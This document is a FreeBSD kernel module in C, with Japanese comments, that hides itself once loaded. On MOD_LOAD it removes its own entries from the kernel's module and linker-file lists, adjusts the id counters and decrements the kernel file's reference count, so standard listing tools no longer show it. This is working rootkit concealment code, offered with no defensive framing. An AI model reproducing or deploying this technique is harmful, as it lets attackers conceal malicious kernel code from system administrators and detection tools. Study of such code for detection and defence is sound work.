#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/linker.h>

extern int nextid;
extern int next_file_id;
extern struct sx kld_sx;
extern linker_file_list_t linker_files;
extern TAILQ_HEAD(modulelist, module) modules;
struct module {
        TAILQ_ENTRY(module)     link;   /* chain together all modules */
        TAILQ_ENTRY(module)     flink;  /* all modules in a file */
        struct linker_file      *file;  /* file which contains this module */
        int                     refs;   /* reference count */
        int                     id;     /* unique id number */
        char                    *name;  /* module name */
        modeventhand_t          handler;        /* event handler */
        void                    *arg;   /* argument for handler */
        modspecific_t           data;   /* module specific data */
};

static void hidemyself()
{
	module_t mod;
	linker_file_t lf;
	
	/* modulesから削除する */
	mtx_lock(&Giant);
	TAILQ_FOREACH(mod, &modules, link) {
		if (strcmp(mod->file->filename, "cantseeme.ko") == 0) {
			TAILQ_REMOVE(&modules, mod, link);
			nextid--;
			break;
		}
	}
	mtx_unlock(&Giant);

	/* そしてlinker_filesからも削除する */
	sx_xlock(&kld_sx);
	TAILQ_FOREACH(lf, &linker_files, link) {
		if (strcmp(lf->filename, "cantseeme.ko") == 0) {
			TAILQ_REMOVE(&linker_files, lf, link);
			next_file_id--;
			break;
		}
	}
	sx_xunlock(&kld_sx);

	/* kernelのlinker_fileの参照数を一個減らす */
	linker_kernel_file->refs--;
}

static int load (struct module *module, int cmd, void *args) 
{
	switch(cmd) {
		case MOD_LOAD:
			hidemyself();
			uprintf("Loaded\n");
			break;
		case MOD_UNLOAD:
			uprintf("Unloaded\n");
			break;
		default:
			return EOPNOTSUPP;
	}
	return 0;
}

static moduledata_t cantseeme_mod = { "cantseeme", load, NULL };

DECLARE_MODULE(cantseeme, cantseeme_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);